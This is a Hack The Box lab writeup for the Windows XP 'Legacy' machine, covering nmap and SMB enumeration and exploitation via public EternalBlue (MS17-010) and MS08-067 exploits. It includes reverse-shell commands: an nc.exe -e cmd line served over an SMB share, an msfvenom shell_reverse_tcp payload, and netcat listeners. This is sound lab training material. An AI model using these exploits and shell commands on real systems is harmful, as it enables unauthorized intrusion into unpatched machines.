---
layout: post
title:  "Legacy Writeup - Hack The Box"
date:   2025-02-21
desc: ""
keywords: "HTB,eJPT,OSCP,Windows,EternalBlue,MS17-010,Easy"
categories: [HTB]
tags: [HTB,eJPT,OSCP,Windows,EternalBlue,MS17-010,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I'm going to take advantage of this high I have to continue investing my energies in solving machines of the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, it is time for a **Windows** machine, the **Legacy** box, classified as **Easy**. It has a well-known vulnerability in the world of Information Security, but it is still present in organizations that for very complex reasons do not update their Operating Systems.

<br /><br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After starting the box, I begin my **Reconnaissance** phase. Many times I have done this first step **wrong**, because I use the commands in an automated way and do not observe the very subtle anomalies that may occur, it is all very well to enter the commands quickly, but you must be well concentrated in order not to waste too much time in the following phases. With `nmap` I get with the open ports (by **TCP** protocol) and I already observe that they are the typical ones of a **Windows** machine, I also look for the Services and their versions to have a panoramic view of possible vulnerabilities. The version of the Operating System that is leaked already makes me think of a possible attack vector.

```bash
ping -c 1 10.129.227.181
whichSystem.py 10.129.227.181
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.129.227.181 -oG allPorts
nmap -sCV -p135,139,445 10.129.227.181 -oN targeted
#    --> OS: Windows XP (Windows 2000 LAN Manager)         EthernalBlue?!
```

<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the knowledge of what services are available on the victim machine, I can try to enumerate them with the `rpcclient`, `crackmapexec`, `smbclient` and `smbmap` tools, but they cannot be accessed without valid credentials. With `nmap` I was able to search for vulnerabilities for the **SMB** protocol, and due to the version it finds several possible attack vectors.

> **[Remote Procedure Call (RPC)](https://www.ibm.com/docs/en/aix/7.3?topic=concepts-remote-procedure-call){:target="_blank"}** is a protocol that provides the high-level communications paradigm used in the operating system. **RPC** presumes the existence of a low-level transport protocol, such as **Transmission Control Protocol/Internet Protocol** (**TCP/IP**) or **User Datagram Protocol** (**UDP**), for carrying the message data between communicating programs. **RPC** implements a logical client-to-server communications system designed specifically for the support of network applications.

> The **[Server Message Block protocol (SMB protocol)](https://www.techtarget.com/searchnetworking/definition/Server-Message-Block-Protocol){:target="_blank"}** is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. It can also carry transaction protocols for interprocess communication. Over the years, **SMB** has been used primarily to connect **Windows** computers, although most other systems -- such as **Linux** and **macOS** -- also include client components for connecting to **SMB** resources.

```bash
rpcclient -U "" 10.129.227.181
crackmapexec smb 10.129.227.181
# Windows 5.1   SMBv1:True

smbclient -L 10.129.227.181 -N
smbmap -H 10.129.227.181 -u 'null' --no-banner

locate *.nse | grep smb-vuln
nmap --script smb-vuln\* -p445 10.129.227.181
```

<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There are several resources on **Github** with exploits developed for the **Eternal Blue Exploit**, I am going to use one that I have used before and had good results, the **[AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010){:target="_blank"}** from **3ndG4me**. You can follow the steps recommended on the website, i.e. create a shellcode to copy into the exploit written in **Python** and then run it, it also has a script to check that the target is vulnerable to **MS17-010** (it also returns the pipes - intermediary between two programs - that can be used to exploit the vulnerability). Unfortunately none of the exploits in this box work for me.

> **[EternalBlue](https://www.hypr.com/security-encyclopedia/eternalblue){:target="_blank"}** exploits a vulnerability in the **Microsoft** implementation of the **Server Message Block** (**SMB**) **Protocol**. This dupes a **Windows** machine that has not been patched against the vulnerability into allowing illegitimate data packets into the legitimate network. These data packets can contain malware such as a trojan, ransomware or similar dangerous program. 

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
python2 eternal_checker.py
python2 eternal_checker.py 10.129.227.181
# [+] Found pipe 'browser'          :)

./shell_prep.sh
  y 10.10.14.62 443 444 1 1

python2 eternalblue_exploit7.py 10.129.227.181 shellcode/sc_x64.bin
python2 eternalblue_exploit7.py 10.129.227.181 shellcode/sc_all.bin
python2 eternalblue_exploit8.py 10.129.227.181 shellcode/sc_x64.bin
python2 eternalblue_exploit8.py 10.129.227.181 shellcode/sc_all.bin
python2 eternalblue_exploit10.py 10.129.227.181 shellcode/sc_x64.bin 
python2 eternalblue_exploit10.py 10.129.227.181 shellcode/sc_all.bin 
# :(
```

<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is another exploit that I can try to use, only a small modification must be made in the code. I need to uncomment a line to inject the command that I want to perform, in this case I want to send me a **Reverse Shell** using `nc.exe` that I will be sharing from my machine, with the help of one of the tools of the **impacket** suite. I can't get the expected result, so I have to look for another way or maybe another **Github** resource.

```bash
nvim zzz_exploit.py
cat zzz_exploit.py | grep 'nc.exe'
locate nc.exe
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
sudo impacket-smbserver smbFolder $(pwd) -smb2support
sudo rlwrap -cAr nc -nlvp 443
python2 zzz_exploit.py 10.129.227.181 -pipe browser         # :(
```

<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

There is another project on **Github** from **worawit**, the **[MS17-010](https://github.com/worawit/MS17-010){:target="_blank"}** exploit that helped me on other **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** boxes. I just need to clone the project to have it on my machine, and I will directly employ the exploit to perform a command execution on the victim machine, thanks to the vulnerability in the **SMB** protocol. By just modifying one line of code, creating the server with `impacket-server` and using `nc` to wait for the connection to my machine, I can this time successfully obtain the so wanted **Reverse Shell**. Once compromised I try some basic commands, but for some reason the `whoami` command throws an error.

```bash
git clone https://github.com/worawit/MS17-010
python2 checker.py 10.129.227.181
# spoolss: Ok (32 bit)
# browser: Ok (32 bit)

# -------------------
# Tips: (If there is no named pipes)
# nvim checker.py --> USERNAME = 'guest'
# -------------------

nvim zzz_exploit.py
# service_exec(conn, r'cmd /c \\10.10.14.62\smbFolder\nc.exe -e cmd 10.10.14.62 443')
sudo impacket-smbserver smbFolder $(pwd) -smb2support
sudo rlwrap -cAr nc -nlvp 443
python2 zzz_exploit.py 10.129.227.181
# Or: > python zzz_exploit.py 10.10.10.4 spoolss

whoami                      # :(
hostname
ipconfig
```

<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I remember that the **SMB** protocol version was also vulnerable to the **MS08-067** exploit, so I also search on **Github** and find a project by **andyacer**, the **[ms08_067](https://github.com/andyacer/ms08_067){:target="_blank"}** exploit that might allow me to find another way to compromise the target machine. I just follow the steps they tell me, create a shellcode with `msfvenom`, modify the script and run it correctly, again I get access to the box. I still have the problem when executing the `whoami` command, but I can now access the user flags required by **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** to prove the compromise of the box.

> The **MS08-067** vulnerability is a **[Buffer overflow](https://www.fortinet.com/resources/cyberglossary/buffer-overflow){:target="_blank"}** vulnerability in the **Windows Server** service. This service runs on **Windows** systems which handles file and print sharing on **Windows** systems and allows communication between network devices.

```bash
git clone https://github.com/andyacer/ms08_067
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.62 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
nvim ms08_067_2018.py
sudo rlwrap -cAr nc -nlvp 443
python2 ms08_067_2018.py 10.129.131.158 6 445

whoami                                        # :(
hostname
```

<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I have the `whoami.exe` binary on my attacking machine, so I'm going to transfer it to the compromised machine, this way I can get the name of the user I was able to log in with.

> **Attacker Machine**:

```bash
locate whoami.exe
cp /usr/share/windows-resources/binaries/whoami.exe .
sudo impacket-smbserver smbFolder $(pwd) -smb2support
```

> **Victime Machine**:

```cmd
copy \\10.10.14.62\smbFolder\whoami.exe .\whoami.exe

.\whoami.exe                                            # :)
```

<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> As I always say about the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, even with **Easy** machines for beginners, you can take advantage of them to assert your knowledge or even to face inconveniences in the **Exploitation** phase. In the field of **Information Security**, setbacks, challenges and uncertainty are a daily occurrence, so one must be prepared to face them, it is time to train the next box. I just have to kill the one I have started.

<br /><br />
<img src="{{ site.img_path }}/legacy_writeup/Legacy_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
